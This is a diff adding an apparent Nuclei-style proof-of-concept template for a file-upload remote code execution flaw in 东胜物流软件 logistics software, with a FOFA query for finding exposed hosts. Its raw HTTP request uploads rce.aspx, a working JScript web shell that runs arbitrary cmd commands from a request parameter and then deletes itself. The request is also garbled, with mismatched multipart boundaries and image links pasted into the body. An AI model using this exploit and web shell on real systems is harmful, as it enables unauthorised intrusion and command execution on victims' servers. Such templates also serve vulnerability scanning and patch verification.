@@ -1,0 +1,41 @@
+id: poc-wb5xkqil67i9rmrk
+info:
+  name: 东胜物流软件 Upload 存在文件上传致RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wb5xkqil67i9rmrk'
+  tags: rce,file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wb5xkqil67i9rmrk
+    fofa: app="东胜物流软件-物流软件"
+http:
+- raw:
+  - 'POST /SoftMng/FileInputHandler/Upload HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTqkdY1lCvbvpmown
+
+
+    ------WebKitFormBoundaryaKljzbg49Mq4ggLz
+
+    Content-Disposition: form-data; name="file"; filename="rce.aspx"
+
+    Content-Type: application/octet-stream
+
+
+    <%@ Page Language="Jscript" validateRequest="false" %><%var c=new System.Diagnostics.ProcessStartInfo("cmd");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c " + Request.Item["cmd"];e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());System.IO.File.Delete(Request.PhysicalPath);Response.End();%>
+
+    ------WebKitFormBoundaryaKljzbg49Mq4ggLz--
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1752856567980-2fd9db88-cdd5-4ef3-9d90-9fd16cc179fe.png)
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1752856568171-2f0fa612-cde3-424b-adb9-9ceae54be1b6.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
